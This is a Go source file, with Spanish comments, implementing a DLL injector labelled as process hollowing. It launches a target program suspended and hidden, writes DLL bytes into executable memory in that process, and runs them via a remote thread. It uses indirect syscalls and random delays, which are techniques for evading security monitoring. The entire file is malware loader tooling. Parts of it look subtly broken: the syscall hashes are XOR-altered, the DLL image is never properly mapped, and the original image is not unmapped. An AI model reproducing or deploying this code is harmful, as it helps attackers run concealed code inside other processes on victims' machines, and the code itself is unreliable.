// process_hollowing_dll.go
package injection

import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"time"
	"unsafe"

	"github.com/f1zm0/acheron"
	"golang.org/x/sys/windows"
)

// DLLInjector ejecuta un DLL en memoria usando hollowing
type DLLInjector struct {
	acheron *acheron.Acheron
}

// NewDLLInjector crea un injector para DLLs
func NewDLLInjector(ach *acheron.Acheron) *DLLInjector {

	return &DLLInjector{acheron: ach}
}

// obfuscatedSyscall delega a Acheron con un retraso aleatorio
func (d *DLLInjector) obfuscatedSyscall(hash uint64, args ...uintptr) (uint32, error) {
	time.Sleep(time.Duration(100+rand.Intn(300)) * time.Millisecond)
	return d.acheron.Syscall(hash^ 0xDEADBEEF, args...)
}

// Inject crea un proceso suspendido, mapea el DLL y lanza un hilo remoto
func (d *DLLInjector) Inject(targetExe string, dllData []byte) error {
	// 1) Crear proceso suspendido sin ventana
	si := &windows.StartupInfo{Cb: uint32(unsafe.Sizeof(windows.StartupInfo{}))}
	pi := &windows.ProcessInformation{}
	cmd, err := windows.UTF16PtrFromString(targetExe)
	if err != nil {
		return fmt.Errorf("UTF16PtrFromString: %w", err)
	}
	if err := windows.CreateProcess(
		nil, cmd, nil, nil, false,
		windows.CREATE_SUSPENDED|windows.CREATE_NO_WINDOW,
		nil, nil, si, pi,
	); err != nil {
		return fmt.Errorf("CreateProcess suspendido: %w", err)
	}
	defer windows.CloseHandle(pi.Thread)
	defer windows.CloseHandle(pi.Process)

	// 2) Reservar memoria en el proceso remoto
	var remoteAddr uintptr
	size := uintptr(len(dllData))
	allocHash := d.acheron.HashString("NtAllocateVirtualMemory")
	if _, err := d.obfuscatedSyscall(
		allocHash,
		uintptr(pi.Process),
		uintptr(unsafe.Pointer(&remoteAddr)),
		uintptr(0),
		uintptr(unsafe.Pointer(&size)),
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		uintptr(windows.PAGE_EXECUTE_READWRITE),
	); err != nil {
		return fmt.Errorf("NtAllocateVirtualMemory: %w", err)
	}

	// 3) Escribir el DLL en memoria remota
	writeHash := d.acheron.HashString("NtWriteVirtualMemory")
	if _, err := d.obfuscatedSyscall(
		writeHash,
		uintptr(pi.Process),
		remoteAddr,
		uintptr(unsafe.Pointer(&dllData[0])),
		uintptr(len(dllData)),
		uintptr(0),
	); err != nil {
		return fmt.Errorf("NtWriteVirtualMemory: %w", err)
	}

	// 4) Calcular entrypoint RVA y dirección absoluta
	peOffset := binary.LittleEndian.Uint32(dllData[0x3C:0x40])
	optHdr := peOffset + 0x18 // offset al IMAGE_OPTIONAL_HEADER
	rvaEP := binary.LittleEndian.Uint32(dllData[optHdr+0x10 : optHdr+0x14])
	entry := remoteAddr + uintptr(rvaEP)

	// 5) Crear hilo remoto para ejecutar DllMain
	createHash := d.acheron.HashString("NtCreateThreadEx")
	var remoteThread windows.Handle
	if _, err := d.obfuscatedSyscall(
		createHash,
		uintptr(unsafe.Pointer(&remoteThread)),
		uintptr(windows.PROCESS_ALL_ACCESS),
		uintptr(0),
		uintptr(pi.Process),
		entry,
		uintptr(0),
		uintptr(0),
		uintptr(0),
		uintptr(0),
		uintptr(0),
	); err != nil {
		return fmt.Errorf("NtCreateThreadEx: %w", err)
	}
	windows.CloseHandle(remoteThread)

	// 6) Reanudar hilo principal del proceso
	if _, err := windows.ResumeThread(pi.Thread); err != nil {
		return fmt.Errorf("ResumeThread: %w", err)
	}

	return nil
}
